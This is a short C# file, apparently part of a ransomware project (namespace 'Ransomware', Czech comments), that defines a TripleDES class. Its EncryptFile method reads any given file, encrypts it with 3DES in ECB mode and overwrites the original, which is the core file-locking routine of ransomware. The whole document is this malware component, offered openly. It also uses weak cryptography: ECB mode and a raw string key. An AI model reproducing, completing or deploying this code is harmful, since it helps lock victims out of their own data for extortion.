using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.IO;

namespace Ransomware
{
    public class TripleDES
    {
        private TripleDESCryptoServiceProvider des = new TripleDESCryptoServiceProvider(); //Vyvolání třídy, která nám umožnuje šifrovat pomocí algoritmu 3des
        public TripleDES(string key)
        {

            des.Key = UTF8Encoding.UTF8.GetBytes(key);
            des.Mode = CipherMode.ECB;
            des.Padding = PaddingMode.PKCS7;
        }
        public void EncryptFile(string filepath)
        {
            byte[] Bytes = File.ReadAllBytes(filepath); 
            byte[] eBytes = des.CreateEncryptor().TransformFinalBlock(Bytes, 0, Bytes.Length);
            File.WriteAllBytes(filepath, eBytes);
        }
     
    }
}
